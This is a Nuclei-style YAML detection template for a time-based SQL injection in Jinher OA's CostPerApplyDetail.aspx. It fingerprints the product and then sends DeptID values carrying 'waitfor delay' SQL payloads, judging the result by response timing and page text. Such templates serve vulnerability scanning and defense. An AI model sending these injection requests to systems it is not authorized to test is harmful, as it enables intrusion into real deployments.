id: poc-yaml-jinher-jhsoft-costperapplydetail-aspx-sqli
info:
  name: "金和OA CostPerApplyDetail.aspx SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 金和OA

flow: http(1) && http(2)

http:
  - id: check-application
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers:
      - type: word
        words:
          - "JHSoft"

  - id: detect-sqli
    method: GET
    path:
      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay%270:0:5%27--"
      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay%270:0:8%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "查看借款明细"
          - "发起部门"
          - "单据编号"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
